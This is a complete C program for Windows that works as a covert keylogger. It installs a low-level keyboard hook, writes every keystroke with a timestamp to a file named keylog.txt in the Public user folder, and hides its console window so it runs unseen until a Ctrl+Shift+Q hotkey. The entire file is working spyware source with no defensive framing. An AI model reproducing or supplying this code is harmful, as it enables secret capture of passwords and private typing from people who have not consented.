#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK hHook;
FILE *logFile;

// Convert virtual key codes to human-readable strings
const char* KeyToString(DWORD vkCode) {
    switch (vkCode) {
        case VK_BACK: return "[Backspace]";
        case VK_RETURN: return "[Enter]";
        case VK_SHIFT: return "[Shift]";
        case VK_CONTROL: return "[Ctrl]";
        case VK_MENU: return "[Alt]";
        case VK_TAB: return "[Tab]";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_ESCAPE: return "[Esc]";
        case VK_SPACE: return " ";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_LWIN:
        case VK_RWIN: return "[Win]";
        default: return NULL;
    }
}

// Keyboard hook callback
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;

        // Timestamp
        time_t now = time(NULL);
        struct tm *tstruct = localtime(&now);
        char timebuf[64];
        strftime(timebuf, sizeof(timebuf), "[%Y-%m-%d %H:%M:%S] ", tstruct);

        char logLine[128];
        const char* keyStr = KeyToString(kbd->vkCode);

        if (keyStr) {
            snprintf(logLine, sizeof(logLine), "%s%s\n", timebuf, keyStr);
        } else {
            BYTE keyState[256];
            char buf[2] = {0};
            GetKeyboardState(keyState);

            // Only log printable characters
            if (ToAscii(kbd->vkCode, kbd->scanCode, keyState, (LPWORD)buf, 0) == 1 && buf[0] >= 32) {
                snprintf(logLine, sizeof(logLine), "%s%c\n", timebuf, buf[0]);
            } else {
                snprintf(logLine, sizeof(logLine), "%s[VK:%d]\n", timebuf, kbd->vkCode);
            }
        }

        fprintf(logFile, "%s", logLine);
        fflush(logFile);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Open log file in Public directory
    logFile = fopen("C:\\Users\\Public\\keylog.txt", "a");
    if (!logFile) return 1;

    // Install low-level keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        fclose(logFile);
        return 1;
    }

    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Message loop with exit hotkey (Ctrl + Shift + Q)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if ((GetAsyncKeyState('Q') & 0x8000) &&
            (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
            (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
            break;
        }
    }

    // Cleanup
    UnhookWindowsHookEx(hHook);
    fclose(logFile);
    return 0;
}
